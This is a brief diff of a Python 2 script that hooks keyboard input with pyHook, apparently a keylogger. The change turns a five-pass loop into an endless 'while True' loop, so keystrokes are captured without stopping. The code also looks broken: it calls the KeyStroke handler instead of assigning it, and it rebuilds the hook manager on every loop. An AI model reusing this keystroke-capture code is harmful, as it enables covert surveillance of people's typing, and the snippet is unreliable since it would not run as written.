@@ -93,7 +93,7 @@ def KeyStroke(event):
 
 def run():
     print "\n 0000000"
-    while ti<5 :
+    while True :
         kl = pyHook.HookManager()
         kl.KeyDown = KeyStroke()
         kl.HookKeyboard()
